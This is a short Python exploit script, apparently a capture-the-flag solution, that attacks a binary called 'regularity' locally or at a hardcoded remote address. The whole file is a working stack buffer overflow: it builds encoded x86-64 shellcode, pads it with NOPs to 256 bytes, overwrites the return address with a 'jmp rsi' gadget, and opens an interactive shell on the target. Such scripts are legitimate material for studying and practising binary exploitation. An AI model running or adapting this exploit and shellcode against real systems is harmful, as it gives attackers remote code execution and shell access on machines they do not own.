#!/usr/bin/env python
import ptrlib as ptr
import sys

exe = ptr.ELF("./regularity")


def connect():
    if len(sys.argv) > 1 and sys.argv[1] == "remote":
        addr = "83.136.251.249:31475"
        addr = addr.split(":")
        host = addr[0]
        port = int(addr[1])
        return ptr.Socket(host, port)
    else:
        return ptr.Process(exe.filepath)


def unwrap(x):
    if x is None:
        ptr.logger.error("unwrap failed")
        exit(1)
    else:
        return x


def main():
    io = connect()

    shellcode = b"\x90" * 0x10
    shellcode += b"\x48\x31\xc9\x48\x81\xe9\xfa\xff\xff\xff\x48\x8d"
    shellcode += b"\x05\xef\xff\xff\xff\x48\xbb\x92\x63\xd5\x82\x44"
    shellcode += b"\x83\x93\xd1\x48\x31\x58\x27\x48\x2d\xf8\xff\xff"
    shellcode += b"\xff\xe2\xf4\xda\xdb\xfa\xe0\x2d\xed\xbc\xa2\xfa"
    shellcode += b"\x63\x4c\xd2\x10\xdc\xc1\xb7\xfa\x4e\xb6\xd6\x1a"
    shellcode += b"\xd1\x7b\xd9\x92\x63\xd5\xad\x26\xea\xfd\xfe\xe1"
    shellcode += b"\x0b\xd5\xd4\x13\xd7\xcd\xbb\xa9\x3b\xda\x87\x44"
    shellcode += b"\x83\x93\xd1"

    pl = shellcode
    pl = pl.ljust(256, b"\x90")
    pl += ptr.p64(next(exe.gadget("jmp rsi;")))

    io.sendline(pl)

    io.sh()


if __name__ == "__main__":
    main()
